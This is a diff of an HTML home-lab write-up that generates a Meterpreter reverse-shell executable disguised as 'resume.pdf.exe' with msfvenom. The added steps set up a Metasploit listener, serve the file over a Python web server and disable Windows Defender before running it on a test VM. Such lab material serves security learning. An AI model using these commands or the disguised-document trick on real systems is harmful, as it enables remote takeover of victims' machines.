@@ -38,8 +38,9 @@
 
 <pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o resume.pdf.exe</pre>
 
-<p>This executable simulates a trojanized document that, once opened, connects back to the Kali Linux attacker machine. I then set up a listener in Metasploit to catch the reverse shell:</p>
+<p>This creates an executable file named resume.pdf.exe that, when executed, will attempt to connect back to the Kali Linux machine on port 4444.</p>
 
+<p>I then set up a listener in Metasploit to catch the reverse shell:</p>
 <pre>
 msfconsole
 use exploit/multi/handler
@@ -52,3 +53,7 @@ run
 <p>To deliver the payload, I hosted it using a Python HTTP server:</p>
 
 <pre>python3 -m http.server 9999</pre>
+
+<p>After disabling Windows Defender for this test, I downloaded and executed the payload on the Windows VM.</p>
+<p>I confirmed the reverse connection using the following command:</p>
+<pre>netstat -anob</pre>
